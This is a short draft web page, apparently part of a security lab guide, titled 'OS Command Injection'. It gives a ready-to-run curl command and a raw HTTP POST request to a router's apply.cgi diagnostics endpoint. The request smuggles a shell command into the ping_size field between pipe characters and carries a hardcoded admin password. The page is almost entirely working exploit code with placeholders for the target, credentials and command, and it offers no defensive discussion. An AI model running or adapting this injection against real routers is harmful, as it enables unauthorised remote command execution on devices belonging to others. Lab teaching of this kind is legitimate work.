+++
title = "OS Command Injection"
date = 2021-10-18T20:39:54-06:00
weight = 5
draft = true
+++


## OS Command Injection
Run the following command:
```sh
cmd="uname -a"
curl -x http://localhost:8080 -k --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_times=5&traceroute_ip=" --data-urlencode "ping_size=|$cmd|" http://172.21.0.15:8080/apply.cgi >/dev/null
```
Make an HTTP POST request to the router like the following:
```
POST /apply.cgi HTTP/1.1
Host: {TARGET_IP}
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Authorization: Basic {BASE_64_CREDENTIALS}
Content-Type: application/x-www-form-urlencoded
Content-Length: 181
Connection: close

submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=|{URL_ENCODED_CMD}|&ping_times=5&traceroute_ip=
```
**NOTE:** Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively
